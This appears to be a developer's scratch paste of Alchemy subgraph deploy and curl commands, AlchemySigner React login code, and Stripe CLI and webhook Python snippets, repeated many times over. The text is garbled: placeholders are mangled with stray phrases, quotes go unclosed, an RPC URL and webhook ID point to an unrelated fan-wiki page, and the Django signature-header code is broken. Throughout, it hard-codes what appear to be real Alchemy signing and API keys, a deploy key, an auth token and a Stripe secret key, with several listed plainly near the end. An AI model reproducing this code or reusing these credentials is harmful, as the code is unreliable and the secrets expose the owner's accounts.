        "contractAddress": "0x0000000000085d4780b73119b644ae5ecd22b376",
        "tokenBalance": "0x0000000000000000000000000000000000000000000000000000000000000000"
      },
      ......
      {
        "contractAddress": "0x0abefb7611cb3a01ea3fad85f33c3c934f8e2cf4",
        "tokenBalance": "0x00000000000000000000000000000000000000000000039e431953bcb76c0000"
      },
      {
        "contractAddress": "0x0ad0ad3db75ee726a284cfafa118b091493938ef",
        "tokenBalance": "0x0000000000000000000000000000000000000000008d00cf60e47f03a33fe6e3"
      }
    ],
    "pageKey": "0x0ad0ad3db75ee726a284cfafa118b091493938ef"
  }
}
curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'
curl https://eth-mainnet.g.alchemy.com/v2/demo \
-X POST \
-H "Content-Type: application/json" \
-d '{"jsonrpc":"2.0","method":"alchemy_getTokenBalances","params": ["0x3f5ce5fbfe3e9af3971dd833d26ba9b5c936f0be", "erc20"],"id":"42"}'
{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz
curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<Stripe_Men In Black agency>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq Y>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma

npm install -g @graphprotocol/graph-cli

graph init --product hosted-service

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key < whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>
  --ipfs https://ipfs.satsuma.xyz

import { AlchemySigner } from "@alchemy/aa-alchemy";

export const signer = new AlchemySigner({
  client: {
    // This is created in your dashboard under `https://dashboard.alchemy.com/settings/access-keys`
    // NOTE: it is not recommended to expose your API key on the client, instead proxy requests to your backend and set the `rpcUrl`
    // here to point to your backend.
    connection: { apiKey: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>" },
    iframeConfig: {
      // you will need to render a container with this id in your DOM
      iframeContainerId: "turnkey-iframe-container",
    },
  },
});
import { AlchemySigner } from "@alchemy/aa-alchemy";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useMemo, useState } from "react";

export const SignupLoginComponent = () => {
  const [email, setEmail] = useState<string>("");

  // It is recommended you wrap this in React Context or other state management
  const signer = useMemo(
    () =>
      new AlchemySigner({
        client: {
          connection: {
            jwt: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>",
          },
          iframeConfig: {
            iframeContainerId: "turnkey-iframe-container",
          },
        },
      }),
    []
  );

  // we are using react-query to handle loading states more easily, but feel free to use w/e state management library you prefer
  const { mutate: loginOrSignup, isLoading } = useMutation({
    mutationFn: (email: string) =>
      signer.authenticate({ type: "email", email }),
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("bundle")) {
      // this will complete email auth
      signer
        .authenticate({ type: "email", bundle: urlParams.get("bundle")! })
        // redirect the user or do w/e you want once the user is authenticated
        .then(() => (window.location.href = "/"));
    }
  }, [signer]);

  // The below view allows you to collect the email from the user
  return (
    <>
      {!isLoading && (
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <button onClick={() => loginOrSignup(email)}>Submit</button>
        </div>
      )}
      <div id="turnkey-iframe-container" />
    </>
  );
};
import { signer } from "./signer";

// NOTE: this method throws if there is no authenticated user
// so we return null in the case of an error
const user = await signer.getAuthDetails().catch(() => null);

import { signer } from "./signer";

export const account = await createMultiOwnerModularAccount({
  transport: rpcTransport,
  chain,
  signer,
});
import { signer } from "./signer";
import { createWalletClient, http } from "viem";
import { sepolia } from "@alchemy/aa-core";

export const walletClient = createWalletClient({
  transport: http("[alchemy_rpc_url](https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator)"),
  chain: sepolia,
  account: signer.toViemAccount(),
});

$ python -m pip install requests
import requests

url = "https://dashboard.alchemy.com/api/webhook-addresses?webhook_id=https%3A%2F%2Fscpf-foundation-roblox.fandom.com%2Fwiki%2FThe_Administrator&limit=1000&after=19"

headers = {
    "accept": "application/json",
    "X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"
}

response = requests.get(url, headers=headers)

print(response.text)

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <skf75fXbMunwJ>

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <skf75fXbMunwJ>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz  



  import { AlchemySigner } from "@alchemy/aa-alchemy";

export const signer = new AlchemySigner({
  client: {
    // This is created in your dashboard under `https://dashboard.alchemy.com/settings/access-keys`
    // NOTE: it is not recommended to expose your API key on the client, instead proxy requests to your backend and set the `rpcUrl`
    // here to point to your backend.
    connection: { apiKey: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>" },
    iframeConfig: {
      // you will need to render a container with this id in your DOM
      iframeContainerId: "turnkey-iframe-container",
    },
  },
});
import { AlchemySigner } from "@alchemy/aa-alchemy";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useMemo, useState } from "react";

export const SignupLoginComponent = () => {
  const [email, setEmail] = useState<string>("");

  // It is recommended you wrap this in React Context or other state management
  const signer = useMemo(
    () =>
      new AlchemySigner({
        client: {
          connection: {
            jwt: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>",
          },
          iframeConfig: {
            iframeContainerId: "turnkey-iframe-container",
          },
        },
      }),
    []
  );

  // we are using react-query to handle loading states more easily, but feel free to use w/e state management library you prefer
  const { mutate: loginOrSignup, isLoading } = useMutation({
    mutationFn: (email: string) =>
      signer.authenticate({ type: "email", email }),
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("bundle")) {
      // this will complete email auth
      signer
        .authenticate({ type: "email", bundle: urlParams.get("bundle")! })
        // redirect the user or do w/e you want once the user is authenticated
        .then(() => (window.location.href = "/"));
    }
  }, [signer]);

  // The below view allows you to collect the email from the user
  return (
    <>
      {!isLoading && (
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <button onClick={() => loginOrSignup(email)}>Submit</button>
        </div>
      )}
      <div id="turnkey-iframe-container" />
    </>
  );
};
import { signer } from "./signer";

// NOTE: this method throws if there is no authenticated user
// so we return null in the case of an error
const user = await signer.getAuthDetails().catch(() => null);

import { signer } from "./signer";

export const account = await createMultiOwnerModularAccount({
  transport: rpcTransport,
  chain,
  signer,
});
import { signer } from "./signer";
import { createWalletClient, http } from "viem";
import { sepolia } from "@alchemy/aa-core";

export const walletClient = createWalletClient({
  transport: http("[alchemy_rpc_url](https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator)"),
  chain: sepolia,
  account: signer.toViemAccount(),
});

$ python -m pip install requests
import requests

url = "https://dashboard.alchemy.com/api/webhook-addresses?webhook_id=https%3A%2F%2Fscpf-foundation-roblox.fandom.com%2Fwiki%2FThe_Administrator&limit=1000&after=19"

headers = {
    "accept": "application/json",
    "X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"
}

response = requests.get(url, headers=headers)

print(response.text)

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz
  curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<Stripe_Men In Black agency>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq Y>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma

npm install -g @graphprotocol/graph-cli

graph init --product hosted-service

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key < whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>
  --ipfs https://ipfs.satsuma.xyz

import { AlchemySigner } from "@alchemy/aa-alchemy";

export const signer = new AlchemySigner({
  client: {
    // This is created in your dashboard under `https://dashboard.alchemy.com/settings/access-keys`
    // NOTE: it is not recommended to expose your API key on the client, instead proxy requests to your backend and set the `rpcUrl`
    // here to point to your backend.
    connection: { apiKey: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>" },
    iframeConfig: {
      // you will need to render a container with this id in your DOM
      iframeContainerId: "turnkey-iframe-container",
    },
  },
});
import { AlchemySigner } from "@alchemy/aa-alchemy";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useMemo, useState } from "react";

export const SignupLoginComponent = () => {
  const [email, setEmail] = useState<string>("");

  // It is recommended you wrap this in React Context or other state management
  const signer = useMemo(
    () =>
      new AlchemySigner({
        client: {
          connection: {
            jwt: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>",
          },
          iframeConfig: {
            iframeContainerId: "turnkey-iframe-container",
          },
        },
      }),
    []
  );

  // we are using react-query to handle loading states more easily, but feel free to use w/e state management library you prefer
  const { mutate: loginOrSignup, isLoading } = useMutation({
    mutationFn: (email: string) =>
      signer.authenticate({ type: "email", email }),
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("bundle")) {
      // this will complete email auth
      signer
        .authenticate({ type: "email", bundle: urlParams.get("bundle")! })
        // redirect the user or do w/e you want once the user is authenticated
        .then(() => (window.location.href = "/"));
    }
  }, [signer]);

  // The below view allows you to collect the email from the user
  return (
    <>
      {!isLoading && (
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <button onClick={() => loginOrSignup(email)}>Submit</button>
        </div>
      )}
      <div id="turnkey-iframe-container" />
    </>
  );
};
import { signer } from "./signer";

// NOTE: this method throws if there is no authenticated user
// so we return null in the case of an error
const user = await signer.getAuthDetails().catch(() => null);

import { signer } from "./signer";

export const account = await createMultiOwnerModularAccount({
  transport: rpcTransport,
  chain,
  signer,
});
import { signer } from "./signer";
import { createWalletClient, http } from "viem";
import { sepolia } from "@alchemy/aa-core";

export const walletClient = createWalletClient({
  transport: http("[alchemy_rpc_url](https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator)"),
  chain: sepolia,
  account: signer.toViemAccount(),
});

$ python -m pip install requests
import requests

url = "https://dashboard.alchemy.com/api/webhook-addresses?webhook_id=https%3A%2F%2Fscpf-foundation-roblox.fandom.com%2Fwiki%2FThe_Administrator&limit=1000&after=19"

headers = {
    "accept": "application/json",
    "X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"
}

response = requests.get(url, headers=headers)

print(response.text)

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz
curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz

  curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<Stripe_Men In Black agency>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq Y>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma

npm install -g @graphprotocol/graph-cli

graph init --product hosted-service

cd <SUBGRAPH_DIRECTORY>

graph deploy <SUBGRAPH_NAME> \
  --version-label <VERSION_NAME> \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key < whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>
  --ipfs https://ipfs.satsuma.xyz

import { AlchemySigner } from "@alchemy/aa-alchemy";

export const signer = new AlchemySigner({
  client: {
    // This is created in your dashboard under `https://dashboard.alchemy.com/settings/access-keys`
    // NOTE: it is not recommended to expose your API key on the client, instead proxy requests to your backend and set the `rpcUrl`
    // here to point to your backend.
    connection: { apiKey: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>" },
    iframeConfig: {
      // you will need to render a container with this id in your DOM
      iframeContainerId: "turnkey-iframe-container",
    },
  },
});
import { AlchemySigner } from "@alchemy/aa-alchemy";
import { useMutation } from "@tanstack/react-query";
import { useEffect, useMemo, useState } from "react";

export const SignupLoginComponent = () => {
  const [email, setEmail] = useState<string>("");

  // It is recommended you wrap this in React Context or other state management
  const signer = useMemo(
    () =>
      new AlchemySigner({
        client: {
          connection: {
            jwt: "alcht_<2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby>",
          },
          iframeConfig: {
            iframeContainerId: "turnkey-iframe-container",
          },
        },
      }),
    []
  );

  // we are using react-query to handle loading states more easily, but feel free to use w/e state management library you prefer
  const { mutate: loginOrSignup, isLoading } = useMutation({
    mutationFn: (email: string) =>
      signer.authenticate({ type: "email", email }),
  });

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has("bundle")) {
      // this will complete email auth
      signer
        .authenticate({ type: "email", bundle: urlParams.get("bundle")! })
        // redirect the user or do w/e you want once the user is authenticated
        .then(() => (window.location.href = "/"));
    }
  }, [signer]);

  // The below view allows you to collect the email from the user
  return (
    <>
      {!isLoading && (
        <div>
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <button onClick={() => loginOrSignup(email)}>Submit</button>
        </div>
      )}
      <div id="turnkey-iframe-container" />
    </>
  );
};
import { signer } from "./signer";

// NOTE: this method throws if there is no authenticated user
// so we return null in the case of an error
const user = await signer.getAuthDetails().catch(() => null);

import { signer } from "./signer";

export const account = await createMultiOwnerModularAccount({
  transport: rpcTransport,
  chain,
  signer,
});
import { signer } from "./signer";
import { createWalletClient, http } from "viem";
import { sepolia } from "@alchemy/aa-core";

export const walletClient = createWalletClient({
  transport: http("[alchemy_rpc_url](https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator)"),
  chain: sepolia,
  account: signer.toViemAccount(),
});

$ python -m pip install requests
import requests

url = "https://dashboard.alchemy.com/api/webhook-addresses?webhook_id=https%3A%2F%2Fscpf-foundation-roblox.fandom.com%2Fwiki%2FThe_Administrator&limit=1000&after=19"

headers = {
    "accept": "application/json",
    "X-Alchemy-Token": "2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby"
}

response = requests.get(url, headers=headers)

print(response.text)

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/promote-live \
 -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>'

curl -X POST https://subgraphs.alchemy.com/api/subgraphs/<TEAM ID>/<SUBGRAPH_NAME>/<VERSION_NAME>/auto-promote-live \
 -H "Content-Type: application/json" -H "x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq"

curl -v \
 'https://subgraph.satsuma-prod.com/<QUERY_KEY>/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

curl -v \
 'https://subgraph.satsuma-prod.com/<ORGANIZATION>/<SUBGRAPH_NAME>/version/<VERSION_NAME>/api' \
  -H 'x-api-key: <whsec_Ka3G2XkXDVxzhdrFzG8n2OFq>' \
  --data-raw '{"query":"{entities(first:1){id}}"}'

{
  "data": {
    "indexingStatusForCurrentVersion": {
      "subgraph": "QmXqNgptc2b5WzwmFfCu8PxsLgetBe5M8eBKvSyu5jqkei",
      "synced": true,
      "health": "healthy",
      "fatalError": null,
      "nonFatalErrors": [],
      "chains": [
        {
          "chainHeadBlock": {
            "number": "17787217"
          },
          "latestBlock": {
            "number": "17787217"
          }
        }
      ]
    }
  }
}

graph deploy example-subgraph-name \
  --version-label v0.0.1-new-version \
  --node https://subgraphs.alchemy.com/api/subgraphs/deploy \
  --deploy-key skf75fXbMunwJ \
  --ipfs https://ipfs.satsuma.xyz
  Alchemy Webhook signing key whsec_Ka3G2XkXDVxzhdrFzG8n2OFq

Alchemy api key 2_30hERlJhrpl9Tgt1a5sX9D7NA_9cby

Auth token alchemy webhooks jE92Hk8uCBZnJEh1PP0PoUVDwnuYFdVp
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
import stripe
stripe.api_key = "sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq"

stripe.Invoice.modify(
  "id",
  auto_advance=False,
)

# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
client = StripeClient("sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq")

client.invoices.update(
  "id",
  {"auto_advance": False},
)

brew install stripe/stripe-cli/stripe
stripe login
Your pairing code is: enjoy-enough-outwit-win
This pairing code verifies your authentication with Stripe.
Press Enter to open the browser or visit https://dashboard.stripe.com/stripecli/confirm_auth?t=THQdJfL3x12udFkNorJL8OF1iFlN8Az1 (^C to quit)
stripe login --interactive
stripe login --api-key sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq

$  stripe listen --forward-to localhost:4242/stripe_webhooks

$  stripe listen --events payment_intent.created,customer.created,payment_intent.succeeded,checkout.session.completed,payment_intent.payment_failed \
  --forward-to localhost:4242/webhook
stripe listen --load-from-webhooks-api --forward-to localhost:5000
Ready! Your webhook signing secret is '{{whsec_dc0d1e55ff9884fa12920805cb72f473b613c1fc28d4465c8615748ec8819d1c}}' (^C to quit)
# Set your secret key. Remember to switch to your live secret key in production.
# See your keys here: https://dashboard.stripe.com/apikeys
stripe.api_key = 'sk_test_51OR5ePGF83d3fsgWlh41IbGHGtqdiPuFhrcWczglEeFJvQxajyQVCQiZYVZz62HOuYL9tA8dxEQ2MRbxbcYsf8OF00CdDfT6Xq'

from django.http import HttpResponse

# If you are testing your webhook locally with the Stripe CLI you
# can find the endpoint's secret by running `stripe listen`
# Otherwise, find your endpoint's secret in your webhook settings in the Developer Dashboard
endpoint_secret = 'whsec_...'

# Using Django
@csrf_exempt
def my_webhook_view(request):
  payload = request.body
  sig_header = request.META['t=1492774577,
v1=5257a869e7ecebeda32affa62cdca3fa51cad7e77a0e56ff536d0ce8e108d8bd,
v0=6ffbb59b2300aae63f272406069a9788598b792a944a07aba816edb039']
  event = None

  try:
    event = stripe.Webhook.construct_event(
      payload, sig_header, endpoint_secret
    )
  except ValueError as e:
    # Invalid payload
    print('Error parsing payload: {}'.format(str(e)))
    return HttpResponse(status=400)
  except stripe.error.SignatureVerificationError as e:
    # Invalid signature
    print('Error verifying webhook signature: {}'.format(str(e)))
    return HttpResponse(status=400)

  # Handle the event
  if event.type == 'payment_intent.succeeded':
    payment_intent = event.data.object # contains a stripe.PaymentIntent
    print('PaymentIntent was successful!')
  elif event.type == 'payment_method.attached':
